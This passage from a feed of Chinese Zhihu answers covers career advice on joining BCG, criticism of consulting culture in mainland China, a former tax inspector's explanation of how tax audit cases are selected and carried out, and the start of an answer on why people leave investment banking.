data-pid=\"y37cfD_e\">三家里面，似乎BCG的文化又更加“学院派”。这一方面意味着你会受到更严格的逻辑和story-telling训练，而不是仅仅学会怎么“立人设”（这三个字儿相信题主进了consulting会有更深体会），另一方面意味着人际关系相比大部分公司更加纯粹和简单。就像有答主说的，不用纠结怎么溜须拍马，做好工作，业务专精，认可自然会到来。</p>\n<p data-pid=\"maY4mibs\">当然，就像我国所有乙方生态，加班到深夜难以避免。MBB三家大致不相伯仲。现在能够晚上12点前收工的项目肯定是好项目。但有时候也会遇到非常强的team+顺手拈来的话题，DD项目下午五点下班不是梦。总而言之，work life balance别想太多了，所有professional servicing没有啥本质区别。但这个过程会让你更能扛事儿。经历过项目上的至暗时刻后，一般工作上的问题都不会再让你纠结了。另外，你在consulting里真正的好朋友，大致都会在苦项目上找到，这些友谊还是蛮纯粹的。所以说，苦项目也不用太抗拒。</p>\n<p data-pid=\"k8sMV7cg\"><u>其次，也是更重要的，千辛万苦卷进consulting/IBD/律所这类工作（排序不分先后），本身特有的“光鲜外表”（为什么打引号，懂的都懂），能让一个刚走出校园的年轻人迅速建立起对日后数十年职业生涯的自信。</u>BCG作为MBB之一，我相信是能实现这点的。</p>\n<p data-pid=\"Ct1nuFqM\">至少在答主离职为止，所接触的客户和同事，要么是企业里相对高层次的管理者，要么是同龄人中的佼佼者。他们的问问题和做事情的方式，不管是不是给你造成困扰，你至少多学到了一个思考的角度，这是很多普通工作难以给予的。当然其他professional servicing工作会有类似特质，只是consulting灵活的组队上项目机制会放大这个效应，让你的exposure更加多样化。在这个过程中，如果你能把项目做的顺手起来，build起来的自信会让你日后几十年都收益的。所谓匹夫不可夺志也，就是这个意思。心态崩了，认命了，才是最可怕的事情。BCG在三家中，目前战略项目/行业研究的比例也是相对更高（答主离职前自身感觉，可能有偏误），这个好处也会更明显。</p>\n<p data-pid=\"3mxkbRmV\">还有一点，BCG餐补和住宿标准也挺高，不知道是不是三家中最高的。倒不是说这点小物质享受能怎么样，只是年轻的时候体验一下，以后做自己的事业更加坚定，不会轻易被物质条件诱惑，因为知道这些东西不过如此。当然，如果这些东西恰是题主想要的话，也不是说就怎么样了，那很好，继续做下去就好了。</p>\n<p data-pid=\"UV7wM7No\"><u>最后，坦诚来说，报酬层面，这是一份上限不低的工作</u>。知乎上年薪千万财务自由的大佬我们不说，至少在consulting survive下来，成为一线城市一个高级中产是没啥问题的。BCG在这三家里面，pay微微有点优势，但是差别没有很大。如果有幸当到了MDP，因为BCG目前项目还有premium，回报我相信相对更丰厚一些。</p>\n<p data-pid=\"A3HOzXlT\">但是，确实consulting有一些共性问题。这也是这些年consulting人才加速流失，逐渐下沉化的重要原因。题主本人也是想明白了这些决定离开。因此，这就引来了第二个话题——</p>\n<p data-pid=\"crtFJrgV\"><b>如果你来了，请多问自己这样的工作状态是不是你想要的？如果不是，不要因为表面的decency骗自己，早点找一个有长期复利效应的career path，踏踏实实的积累。one day you will be some one.</b></p>\n<p data-pid=\"yP_R7ag9\"><u>第一，咨询不承担决策责任，除了客户关系以外，其他方面没啥复利效应。</u>干久了难免会觉得，好像只要逻辑上严谨，找个框架把客户框进去，就能把项目干好，陷入迷思。此外大部分人做的项目主题零散，其实很难有真正的积累。甚至做久了，咨询老兵会有点在sell人设的状态，只要客户觉得你懂就行了，但扪心自问，真的有水平操盘么？</p>\n<p data-pid=\"QBtx_NkD\"><u>第二，不知道另外两家如何，至少BCG GC是一个大锅饭现象非常明显的地方</u>。收入角度，所谓star performer和表现不及格的员工，大概能差出20-30%？最多了。再加上比起其他exit option，这个pay实在是没啥竞争力，寒了很多小伙伴的心。我身边这样的例子就蛮多。当然这可以理解，本质上咨询顾问这行讲究的是fungibility（同质化），其实项目真就是换个人，无非是做的苦点，总能交付。另外你就是再有能力，最后还是按小时charge，所以真实的人效是没太大差别的。so fair enough。另外MBB三家我相信都是非常的institutionalized，确实没有任何人是too important to lose。因此给你溢价也没啥必要。如果题主有朝一日成了star，心态放平就好。</p>\n<p data-pid=\"PNifxaK5\"><u>最后，有个新的趋势，各家咨询公司都做的越来越实操，即为了做大营收规模，做越来越多的operational项目，其实导致了人才结构发生了很大变化。这个问题，三家里面，我了解的有限信息，BCG程度最浅，麦肯锡程度最深</u>。往好听了说，咨询公司做的东西落地了，这不是好事儿么？是好事儿，对公司对客户都是，但对员工呢？这本质上就把咨询公司的生意从sell thinking变得更加sell labor。做战略/行研项目可能更多需要有business acumen的名校毕业生，聪明人。但ops项目很明确，就是行业里的老法师（忽悠好对接的客户爸爸，反正一条船上，翻船了甲乙方一起糊弄上面的领导就行）+几个执行效率高的普通毕业生就好了（都是列表格、写deadline、做regular reporting ppt，培训下面员工的事儿，不是说这东西不锻炼人，是不需要在这里锻炼，机会成本太高，有这么hands-on觉悟，自己创业多好）。</p>\n<p data-pid=\"is9_tGgh\">这样的人员需求结构难免导致双向选择。就像其他答主说的，现在公司里的氛围开始奇怪了起来，一些“老法师”老兵油子的习气实在是把年轻同事们给气到了。21扩招的规模也很大，开始不挑食了起来，进了不少奇奇怪怪的人，title还都不低。再混合大锅饭的气质，导致21年至少BCG流失了挺多优秀的人。说实话，站在公司的角度，这趋势没啥必要去扭转，也很难扭转。站在毕业生角度，可能至少2-3年内，这个问题还不至于压过前面说的优点，因此作为一个成长的跳板还是不错的。</p>\n<p data-pid=\"sgYXqRAu\">做个总结吧，刚刚毕业，按目前能进BCG的应届生，如果问出了这个问题，我建议还是来历练的。答主本人也很感谢自己在BCG遇到的老板、同事，尤其是合作最多的几位老板们，说是知遇之恩不为过。BCG的文化也足够包容，鼓励你去外面闯闯，同时stay in the community。你做的好了，能给公司带来更多项目，因为你知道有些团队还是能deliver出很好的东西；做的不好，公司也大都欢迎你随时回来。</p>\n<p data-pid=\"ItZO-Yjn\"><b>总而言之，看完上面的应该也发现了，其实上述的优点缺点只是BCG/consulting的特点在不同时期所表现出来的形式。正所谓，盈亏同源，你很难只要这种特点的好处，但不接受这个特点的问题。</b></p>\n<p data-pid=\"DqP2a3fN\">谨此，祝题主事业顺利，可以不走那么多弯路的情况下，找到自己想要的。</p>\n<br><br>\n来源：知乎 www.zhihu.com<br>\n    \n作者：<a href=\"http://www.zhihu.com/people/feng-shu-80-31?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=author\">枫叔</a><br><br>\n【知乎日报】千万用户的选择，做朋友圈里的新鲜事分享大牛。\n        <a href=\"http://daily.zhihu.com/?utm_source=rssyanwenzi&amp;utm_campaign=tuijian&amp;utm_medium=rssnormal\" target=\"_blank\">点击下载</a><br><br>\n此问题还有 <a href=\"http://www.zhihu.com/question/496888574/answer/2321056769?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">3 个回答，查看全部。</a><br>\n                延伸阅读：<br><a href=\"http://www.zhihu.com/question/314865642?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">关于工作选择麦肯锡还是东方航空？</a><br><a href=\"http://www.zhihu.com/question/25873154?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">怎样才有可能加入麦肯锡？</a><br>\n","link":"http://www.zhihu.com/question/496888574/answer/2321056769?utm_campaign=rss&utm_medium=rss&utm_source=rss&utm_content=title"},{"title":"波士顿咨询(BCG）的企业文化是怎样的，推荐应届生加入吗？","date":"2022-02-15 04:19:42","description":"\n<p data-pid=\"x391V2iy\">前面两个答主说的都很真实了，我只说我看到的。BCG是很好的企业，但是地区不同差距很大，我吐槽的只是大陆的BCG。若有冒犯，删掉知乎，去小红书。BCG的confidential培训的很清楚在职人员不要在网上如何如何，所以打着BCG私信一些奇怪语言的，我只能说建议重新温习一下公司要求。</p>\n<ol>\n<li data-pid=\"6-LU16tt\">从大家最关心的角度分四个大区：BCG 大陆；BCG HK；BCG 亚洲；BCG 其他地区包括北美</li>\n<li data-pid=\"ElOxyWQj\">以上四块文化上是大陆最差；PUA程度是日本/韩国/大陆/HK可以互相pk；待遇上北美欧洲是最好；专业性是US office&gt; UK Office &gt; Hong Kong Office &gt;=其它</li>\n<li data-pid=\"wFca8Czs\">应届生肯定是top choice，必须推荐加入，文化再差镀金也要，无论哪一家只要不是Mck的lanyue…… 毕竟精英招牌在这里哪怕忍一年未来也可期</li>\n<li data-pid=\"BS-1VuwO\">说最重要的心态：</li>\n</ol>\n<p data-pid=\"mBgtZ5o0\">首先身边纽约office的MBBer的真精英没有一个有架子，都是善于社交，待人随和，背景你也不用看，3.9gpa+ 藤校毕业… 但是国内的新人心态吧…… 你可以去看小红书。虽然很多是假的，或者80%以上的帖子是盗图，但在所有真真假假中的共性就是虚荣。其实能力到达一定程度的人是不会什么都往网上发的，你喝个可乐会：</p>\n<p data-pid=\"u98Lpq_S\">“哇！接好运！姐妹们我终于盼来了新动的offer！”吗？</p>\n<p data-pid=\"3M7E96of\">还有很多PhD毕业的，包括Oxford毕业的PhD，觉得加入了瞬间社会地位升一级，我觉得真心浪费博士资源。如果只为镀金去industry读个屁博士啊，浪费时间浪费资源。当然还是尊重人家选择，但都这把岁数经历这么多之后，还小红书上发，很low。我是没见过哪个Harvard PhD毕业去当个搬砖的还要发小红书要收集陌生人的羡慕的。</p>\n<p data-pid=\"4eyJI-Xo\">这是BCG大陆底层新人心态…</p>\n<p data-pid=\"e_PXF43N\">再说高级一点的领导们。样本有限，就一个事。某BCG project leader给analyst候选人面试居然不懂framework，也不知道怎么带case。用面试PTA的case去面一个刚面完北美Mck的候选人… 候选人跟我这么形容：</p>\n<p data-pid=\"8A6AxCs4\">“Case上十分不专业；全程用中文；没让候选人自我介绍；面试结束不问候选人是否有问题；面试过程中失态吼候选人；1小时的面试23分钟匆匆结束如同完成任务一般”…</p>\n<p data-pid=\"1FYi2aja\">MBB的面试要求至少一半是英文已检测候选人英文水平；case这个project leader因为是外面跳过来的，完全不知道怎么带case；面试过程中出现吼候选人更是快把BCG招牌都砸了… 这个事情如果发生在NYC的话那估计这个project leader要被处罚了。</p>\n<p data-pid=\"9Kk3D-I2\">然而这个事情就是来自上海office的某project leader在近期的表现。</p>\n<p data-pid=\"GPYdSEyM\"><b>总之，很多东西真的一来中国大陆就很奇怪，你也不知道为什么。—- 这是我这些年的感受。</b></p>\n<p data-pid=\"D5Pggja5\"><b>BCG只是例子之一；但有很多企业文化最后搞的吸收了国企的官僚；外企的精英利己主义；私企领导的不要脸皮和加班… 但优点一点也没吸收。</b>反正咨询在大陆是搞成了不上不下，完全丢了北美咨询的地位，弄的Mck居然想出和四大抢饭碗搞低端线建立lanyue了… 问题是国内四大咨询也没搞成北美Monitor/Parthenon那种等级啊…… </p>\n<p data-pid=\"468tggKl\">对应届生而言，总结概括的话，就是镀金可以，但绝不是终点。</p>\n<br><br>\n来源：知乎 www.zhihu.com<br>\n    \n作者：<a href=\"http://www.zhihu.com/people/paola-84?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=author\">XXXX</a><br><br>\n【知乎日报】千万用户的选择，做朋友圈里的新鲜事分享大牛。\n        <a href=\"http://daily.zhihu.com/?utm_source=rssyanwenzi&amp;utm_campaign=tuijian&amp;utm_medium=rssnormal\" target=\"_blank\">点击下载</a><br><br>\n此问题还有 <a href=\"http://www.zhihu.com/question/496888574/answer/2318806313?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">3 个回答，查看全部。</a><br>\n                延伸阅读：<br><a href=\"http://www.zhihu.com/question/314865642?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">关于工作选择麦肯锡还是东方航空？</a><br><a href=\"http://www.zhihu.com/question/25873154?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">怎样才有可能加入麦肯锡？</a><br>\n","link":"http://www.zhihu.com/question/496888574/answer/2318806313?utm_campaign=rss&utm_medium=rss&utm_source=rss&utm_content=title"},{"title":"如何看待公司被税务稽查这件事？","date":"2022-02-15 04:18:29","description":"\n<p data-pid=\"BMy7eGpl\">税务稽查的来回答一下。</p>\n<p data-pid=\"uI9qVA7p\"><b>第一阶段：税务稽查案件的选取。</b></p>\n<p data-pid=\"2gax3Dfs\">税务稽查案件的选取，相当一部分是来源于基于税务大数据的分析，相关指标与模型的建立既需要IT背景也需要税收业务背景。本人曾经是IT工程师，后来考了税务师转做税务稽查，所以曾被抽调参与了相关指标及模型的建立，对其中的某些环节是比较了解的。</p>\n<p data-pid=\"wBEzWzTR\">本文除引用的文件内容外，其余部分都基于本人的个人理解和解读，不复制粘贴，内容原创。</p>\n<p data-pid=\"erXUGLdQ\"><b>税务稽查案件的来源参照国家税务总局的《税务稽查案源管理办法（试行）》第十五条：</b></p>\n<p data-pid=\"M8URVRnO\">根据案源信息的来源不同，将案源分为九种类型：</p>\n<p data-pid=\"pOEMwGQB\">　　（一）推送案源，是指根据风险管理等部门按照风险管理工作流程推送的高风险纳税人风险信息分析选取的案源；</p>\n<p data-pid=\"c4QReCIz\">　　（二）督办案源，是指根据上级机关以督办函等形式下达的，有明确工作和时限要求的特定纳税人税收违法线索或者工作任务确认的案源；</p>\n<p data-pid=\"JKLYyGJy\">　　（三）交办案源，是指根据上级机关以交办函等形式交办的特定纳税人税收违法线索或者工作任务确认的案源；</p>\n<p data-pid=\"PJauSucM\">　　（四）安排案源，是指根据上级税务局安排的随机抽查计划和打击偷税（逃避缴纳税款）、逃避追缴欠税、骗税、抗税、虚开发票等稽查任务，对案源信息进行分析选取的案源；</p>\n<p data-pid=\"kc2qby_d\">　　（五）自选案源，是指根据本级税务局制定的随机抽查和打击偷税（逃避缴纳税款）、逃避追缴欠税、骗税、抗税、虚开发票等稽查任务，对案源信息进行分析选取的案源；</p>\n<p data-pid=\"JKncAPNp\">　　（六）检举案源，是指对检举线索进行识别判断确认的案源；</p>\n<p data-pid=\"TFs9WgyH\">　　（七）协查案源，是指对协查线索进行识别判断确认的案源；</p>\n<p data-pid=\"yKNWidq2\">　　（八）转办案源，是指对公安、检察、审计、纪检监察等外部单位以及税务局督察内审、纪检监察等部门提供的税收违法线索进行识别判断确认的案源；</p>\n<p data-pid=\"gZU6Bvjh\">　　（九）其他案源，是指对税务稽查部门自行收集或者税务局内、外部相关单位和部门提供的其他税收违法线索进行识别判断确认的案源。</p>\n<p data-pid=\"n3qbdS49\">下面逐一进行讲解，各位可自行对照：</p>\n<p data-pid=\"085lK85P\"><b>一、推送案源：是指根据风险管理等部门按照风险管理工作流程推送的高风险纳税人风险信息分析选取的案源。</b></p>\n<p data-pid=\"98ozdbrR\">税务部门有个风险管理等部门（各地的称呼可能不太一样），大致的工作是利用大数据对纳税人申报的一些涉税信息、财务信息，以及获取的与其他相关部门的交换信息、境外税收交换信息等进行综合分析。根据对这些信息的分析、比对来判断某个纳税人存在涉税问题的可能性，最终会产生一个分值，然后根据这个分值进行逆排序，然后根据排序后的结果来确定税务稽查的案源。</p>\n<p data-pid=\"vuhmfyty\">举个例子，以最简单的利润率作为指标，如何筛选待查案源。假设某市计划选取某个行业的100户纳税人作为检查对象：</p>\n<p data-pid=\"gDjBKzmf\">根据纳税人报送的财务报表，是很容易计算出某个行业的平均利润率的（select avg(...) from ... where ...  IT人士都懂的，就一条语句的事，不过已经被封装到具体应用里了，不需要操作人员自己敲sql语句）。假设计算出的某行业的平均利润率是10%，通过某种变换，使得比10%小得越多的，分值越高（税收风险系数），比10%大得越多的，分值越低。这样就算出了某个行业中每个纳税人的这个分值。然后逆排序，分值高的在前，分值低的在后，然后取前100名。当然，这里还需要考虑一些其他因素，比如这个企业n年内已经被查过了，那就不进行排名。另外，如果选100户进行检查的话，一般会选200-300户，所以严格来说，上面所说的选取前100名其实应该选取前200-300名，这有点像考公务员。税务稽查的正常检查，有个环节叫自查。也就是先由被抽到的纳税人自行检查一下，再给一次坦白从宽的机会。然后根据自查的情况再来确定到底查哪个纳税人。比如一个年销售额一亿的企业，风险值也不低，但是自查只有1万元税款，那么被确定为稽查对象的可能性就相对较大。通过上述的步骤，最终确定100户的计划名单。</p>\n<p data-pid=\"K1sJf9Be\">实际的选案比这个复杂得多，指标和模型可能有好成百上千个，而且筛选条件可能是指标和模型的组合而不是利润率这样的单一指标。比如：销售收入和用电量的变动对比。比如，结合企业规模的利润率：利润率还需要考虑企业的规模，小微企业和上市公司即使是同一地区同一行业，利润率也不一定有可比性。</p>\n<p data-pid=\"nFsBbBHn\"><b>二、督办案源，是指根据上级机关以督办函等形式下达的，有明确工作和时限要求的特定纳税人税收违法线索或者工作任务确认的案源</b></p>\n<p data-pid=\"xuIGbXOi\">这个从字面上理解即可，没有什么需要特别解读的了。上面指定要查的，通常来头都比较大，需要经常向上面汇报案情和进展，领导们为了自己的美好前程肯定会相当重视，这类税务稽查基本上谁摊上谁自认倒霉。</p>\n<p data-pid=\"jIZkY945\"><b>三、交办案源，是指根据上级机关以交办函等形式交办的特定纳税人税收违法线索或者工作任务确认的案源</b></p>\n<p data-pid=\"vBOtGfDs\">交办案源相对于督办案源来说，压力会稍微小一些。有可能是某些举报人把举报信写到了上级机关那里，上级机关一看，这个案件应该由下面某个市负责，于是交办下来了。也有可能是某些非税务机关在执法过程中发现有税收违法行为，这些机关对税收违法行为没有执法权，于是把这些资料和信息通报给了上级税务机关，然后由上级税务机关交稽查局进行检查。</p>\n<p data-pid=\"VftT7gxe\"><b>四、安排案源，是指根据上级税务局安排的随机抽查计划和打击偷税（逃避缴纳税款）、逃避追缴欠税、骗税、抗税、虚开发票等稽查任务，对案源信息进行分析选取的案源</b></p>\n<p data-pid=\"SDNyX0aY\">安排案源是根据上级稽查局安排的年度检查计划，对某一行业或者某种税收违法行为开展的检查。比如由于2019年西安奔驰女车主事件，引起社会广泛关注，于是组织了对汽车4S店的税务检查。比如税务机关查处某特大虚开增值税发票案件，有几千家企业取得了这些虚开的发票，涉嫌偷税，那么就会组织对这些涉嫌收受虚开发票的企业进行税务检查。由于某一行业或者有可能存在某种税收违法行为的纳税人数量太多，每一家都检查不现实，所以通常会采用随机抽查的方法来确定稽查对象。具体的流程和推送案源差不多，也要先有个自查的过程，通常会对几倍于最终稽查对象数量的纳税人发出税务事项通知书，要求纳税人先自查，然后根据自查情况来确定最终稽查对象。</p>\n<p data-pid=\"oMp084U3\"><b>五、自选案源，是指根据本级税务局制定的随机抽查和打击偷税（逃避缴纳税款）、逃避追缴欠税、骗税、抗税、虚开发票等稽查任务，对案源信息进行分析选取的案源</b></p>\n<p data-pid=\"w87JVKLk\">和安排案源的区别只有\"<b>本级</b>”两个字。安排案源是“<b>上级</b>”。根据字面意思就能理解，自选案源不是上级布置的任务，是本机税务局确定的案源，相对来说自主性会高一些。</p>\n<p data-pid=\"MXeGQkZW\"><b>六、检举案源，是指对检举线索进行识别判断确认的案源</b></p>\n<p data-pid=\"-XSxp4lW\">检举案源其实就是通常所说的举报案件。更准确地说，“是指对检举线索进行识别判断确认的案源”，意思是，举报的线索必须是比较清晰的，证据比较确凿的。<b>能够识别（能确定涉嫌违反税收法律法规的是谁）、判断确认（是不是真的存在涉税违法行为）。</b>如果你举报说你曾经听说某老板收入不入账，这部分收入流入了个人腰包，那么被列入检举案源的可能性就相对较低，除非稽查局实在没案源可查了。这里的问题在于，第一、道听途说没有实锤证据的受理的可能性较小。第二、提供的线索必须比较清晰，比如要说明具体是哪个老板，是哪个企业的老板（毕竟同名同姓的老板还是存在的）。第三、收入不入账的证据，最好是白纸黑字的证据。比如内账的复印件？比如送货单？或者卖给哪个企业或者个人的货的收入没入账？这样税务机关才能有的放矢。毕竟检查人员很忙，如果你多写几个字，说不定就能让检查人员少花很多时间和精力。第四、最好实名（事实上绝大多数举报人都是实名，表现出了铮铮铁骨的英雄气概，非常令人敬佩），为自己的行为负一定责任（其实一般也不会有啥责任）。就怕检查人员费了九牛二虎之力查了一遍发现根本没这么回事，然后你轻飘飘地来一句“Sorry，我听错了。”，大家都这样操作的话，国家机关的工作效率就要大打折扣了。到时候浪费的还是你这个纳税人的钱，搬起石头砸自己的脚。</p>\n<p data-pid=\"hQsqpuTo\">任何个案源类型展开讲都需要不少篇幅，只能一段一段写了。</p>\n<p data-pid=\"oMGmxg8G\">这里临时插播一段关于第二阶段——在收到税务稽查局的自查通知，要求先自查的情况，两段并行。</p>\n<p data-pid=\"4puubEsD\"><b>第二阶段：自查</b></p>\n<p data-pid=\"J5ze7YD7\">不得不承认想出“自查”这一招的是高人。如果稽查局一年能查100个案件的话。那么通过自查，差不多能查300个甚至更多。其中200个是“自查”的。从事税务稽查的都知道，查一个案件是非常麻烦的，要投入大量时间和精力看账、取证、外调、做文书、扯皮（混子除外）。通过增加“自查”这一手段，其中的200个案件省略了大部分此类工作。</p>\n<p data-pid=\"TGi6SBc6\">自查对纳税人来说，未必是坏事，尤其是对财务负责人来说，很可能是好事。自查补缴的税款没有罚款，属于纳税人自我纠正补交税款。传出去好听，向老板汇报时财务负责人的压力小，因为这部分税款其实是从前应该交但是没有交的，老板容易接受。但是，如果被税务稽查局立案检查，补缴税款并处罚款，会收到税务机关处理和处罚的文书，老板知道了很可能会暴跳如雷，毕竟面子上很不好看。企业规模越大，老板越在意社会形象，钱反而不是最大的问题。行政处罚还有可能影响企业征信，融资成本可能会受到影响，损失不仅限于补缴的税款和滞纳金、罚款。如果是上市公司，还需要信息披露，会直接影响股价，老板的个人财富缩水，估计心会滴血。如果发生这样的情况，财务负责人的压力是很大的。</p>\n<p data-pid=\"yDcRQ6Pm\">所以自查其实挺重要的，能把浮于表面，非常容易被查出来的一些问题自己先处理掉，而且还会增加不被列入100个立案检查的纳税人名单的概率，还是值得的。</p>\n<p data-pid=\"xUyvOLDI\">自查会收到税务机关发的文书，通知纳税人需要自查的纳税年度，以及递交自查结果的截止期限。文书通常是《税务事项告知书》。</p>\n<p data-pid=\"spbHjdDQ\"><b>第三阶段：立案检查</b></p>\n<p data-pid=\"FgAMAVsx\">被列入上述例子中100个需要立案检查的纳税人名单后，就要静候税务机关的通知，调账或者直接上门进行检查了。按照<b>《中华人民共和国税收征收管理法》</b>和<b>《税务稽查工作规程》</b>的规定，检查人员必须两人以上，先向纳税人送达《税务检查通知书》，通知纳税人正式开始立案检查，检查人员是谁，检查由哪个税务机关负责，检查哪几个年度，纳税人的权利和义务等等内容。检查人员会事先出示税务检查证表明身份，检查证的式样可以自行百度，各省可能会有些差异。</p>\n<p data-pid=\"Y-wgHeme\">检查的方式分实地检查和调账检查。两者的区别在于调账检查需要把纳税人的账册、凭证及相关资料调到税务机关检查，如果是实地检查，上述资料不需要调到稽查局，检查人员会隔三岔五来纳税人这里看凭证和资料。大多数情况下税务机关会选择实地检查而非调账检查。因为相当一部分纳税人的涉税资料非常多，我甚至遇到过用卡车运过好几车的情况，搬运和整理非常麻烦。其次，很多涉税线索不一定仅存在于账册凭证和相关资料里。</p>\n<p data-pid=\"ZdlyOXUj\">检查的方法主要分全查法和抽查法。“抽查法”采用得较多。“全查法”通常被认为是菜鸟专业方法，相当于不看地图就一头扎进迷宫，可能在里面转一年也搞不清楚迷宫的内部情况。更有效率的方法是从报表→总账→总分类账→明细账→分录→附件→相关资料这样的顺序来不断缩小范围，逐层锁定涉税问题。</p>\n<p data-pid=\"JbkuDcG_\">关于检查的过程就没法具体写了。这是税务工作中为数不多的没有刻板流程的环节，需要随机应变，也是我选择稽查工作的原因之一。我不喜欢死气沉沉一成不变的工作，喜欢面对一些挑战。</p>\n<p data-pid=\"_EcWWfBX\">面对正式的立案检查，老板或者单位负责人多多少少会有点压力。如果平时做得比较规范的话，应该不太会有什么大问题。其实做得规范不规范，有没有问题，老板心里门清。根据多年查账的经验，绝大多数外企是非常规范的，问题也是最少的。其次是上市公司，然后是国企，然后是大型民企，最不规范，问题最多的是中小型民企。目前税收政策的制订与解读，正朝着有利于纳税人，或者越来越宽松的方向发展。</p>\n<p data-pid=\"REsXrwcM\">近几年来，随着对<b>《中华人民共和国行政处罚法》</b>的深入解读，以前雷打不动的以百分之五十为下限的罚款倍数也出现了松动，甚至可以少罚或者不罚。但是对税收滞纳金计算方法的解读出现了某种意义上的“退步”，至少我个人认为这是一种退步或者不合理。若干年前，在相当一部分地区，计算税收滞纳金的起始日期无争议，是应缴纳税款最后期限的后一日，但截止日期存在一定的争议。因为税务机关立案检查之后，税务的征收管理系统通常会对检查年度的税款申报进行锁定，企业无法补申报。举个例子：某税务机关2020年12月24日起对某企业2017年-2019年的涉税情况进行税务检查，立案之后，系统会禁止企业补申报2017年1月至2019年12月（这个期间在税务术语中被称为“检查所属期”）这个所属期内的税款，我觉得这也是合情合理的要求。因为之前已经给过一次自查的机会，企业能自查自纠的，已经在此之前完成了。立案检查之后，税务机关发现的问题就属于非企业自查自纠，而是由税务机关检查发现的。如果在检查期间不锁定检查所属期的税款补申报，那么税务机关发现一个问题，企业就可以立刻去补申报这个问题涉及的少缴税款。这样一来，这就不是税务机关在检查，而仍然是企业在自查了。所以检查期间锁定检查所属期税款申报是非常合理的。但是这一措施的实施，带来了另外一个问题，在开始立案检查后的这段时间内，如果纳税人得知自己少交了税款，是有意愿补缴这部分税款的。但是，由于锁定检查所属期税款补申报的原因，却无法补缴这部分税款，直至检查结束才可以。那么从开始检查到检查结束这段时间产生的税收滞纳金该怎么算呢？毕竟这部分滞纳金不是纳税人不补缴税款产生的，而是由于想交但是却交不进来产生的。所以若干年前税务机关的做法是以开始检查的前一日作为计算税收滞纳金的截止日期。这样就避免了纳税人在检查开始后想补缴税款却交不了税款所产生的这部分滞纳金。有些税务检查可能旷日持久（大家可以自行百度一下某些涉税案例，整个检查过程甚至要持续数年。），涉税金额也比较大，滞纳金是个天文数字。但是目前运行的金税三期系统的计算税收滞纳金的截止日期是到税款入库之日，通俗点说就是哪天把税交进来哪天停止计算税收滞纳金，不考虑税没交进来是由于纳税人自己的原因还是税收征管系统锁定交不进来。所以<b>这里有个小技巧，</b>在补税金额比较大的情况下，可能为老板节省不少滞纳金，那就是在检查期间，如果检查人员发现问题，而且企业认为证据确凿，无争议，应该尽快就这一问题计算出需要补交的税款，然后通过预缴查补税款的方式先交掉，避免后面产生的大量滞纳金。这也算是金税三期系统对上述问题的一个补救措施。<b>第二个小技巧是</b>：有时候，可能根据发现的问题没法精确计算出要补缴的税款，因为后续发现的问题有可能会影响第一个问题所涉及的税款。或者由于涉及第一个问题的资料比较多，无法在短时间内计算出精确结果，但可以立刻估算出一个大致结果。这种情况下，可以不用那么精确，先估算一个补缴税款的数据，然后预缴。举个例子：比如检查发现一个问题，估算一下，2017年度至少少交企业所得税50万元，那么就可以先预缴2017年度企业所得税50万元。也许最后经过精确计算，算出这一问题实际少交2017年度企业所得税512345.67元，那么只有512345.67-500000=12345.67元滞纳税款在继续计算税收滞纳金，50万的滞纳金停止计算了，避免了绝大多数损失。</p>\n<p data-pid=\"o_hKz4cE\">立案检查的内容比较丰富，比如取证、笔录、外调等等，一时半会写不完，先告一段落，以后再补充。暂时跳到第四阶段------审理。</p>\n<p data-pid=\"9N_kh1bk\">/*<b>---------------------------------------------------------------------------------------------*/</b></p>\n<p data-pid=\"Wfk319sF\"><b>第四阶段：审理</b></p>\n<p data-pid=\"DtUorBZ1\">检查结束、取证到位后，检查人员对这些证据进行整理，由被查纳税人的相关人员（比如法定代表人、财务负责人、会计等）签字盖章进行确认，一些总结性的证据材料比如《稽查工作底稿》只能由法定代表人签字盖章确认。最后形成一个初步的处理意见。这些内容主要在《税务稽查报告》中。</p>\n<p></p>\n<br><br>\n来源：知乎 www.zhihu.com<br>\n    \n作者：<a href=\"http://www.zhihu.com/question/23930242/answer/1581513505?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\">知乎用户（登录查看详情）</a><br><br>\n【知乎日报】千万用户的选择，做朋友圈里的新鲜事分享大牛。\n        <a href=\"http://daily.zhihu.com/?utm_source=rssyanwenzi&amp;utm_campaign=tuijian&amp;utm_medium=rssnormal\" target=\"_blank\">点击下载</a><br><br>\n此问题还有 <a href=\"http://www.zhihu.com/question/23930242/answer/1581513505?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">49 个回答，查看全部。</a><br>\n                延伸阅读：<br><a href=\"http://www.zhihu.com/question/320774636?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">为什么税务大厅的工作人员不喜欢代账公司的人？</a><br><a href=\"http://www.zhihu.com/question/285486186?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">公司企业，应对税务稽查，需要注意什么？</a><br>\n","link":"http://www.zhihu.com/question/23930242/answer/1581513505?utm_campaign=rss&utm_medium=rss&utm_source=rss&utm_content=title"},{"title":"让人离开投资银行的原因都有哪些？","date":"2022-02-15 04:15:31","description":"\n<p data-pid=\"s4wAkqbO\">非常好的一个问题，这么靠后也不知道会不会有人看。</p>\n<p data-pid=\"3P976z_7\">先说说本人情况吧，头部投行在职。未来3-5年内暂时没有离开投资银行的计划，原因无他，工作薪酬还不错，同时还没有跳出平台的能力，各项技能也还未成熟。</p>\n<p data-pid=\"zyZiR2yA\">自我从业以来，陆陆续续也有若干同事跳槽，有跳友商的，也有跳到外部的，下面简单说说跳外部前同事的情况，也供朋友们参考参考。</p>\n<p data-pid=\"ZKKltewj\">同事A：投行从业3年，后跳至某A股公司投资部，期间参与了IPO和重组项目，觉得投行工作缺乏足够挑战性，故选择更为感兴趣的产业并购。</p>\n<p 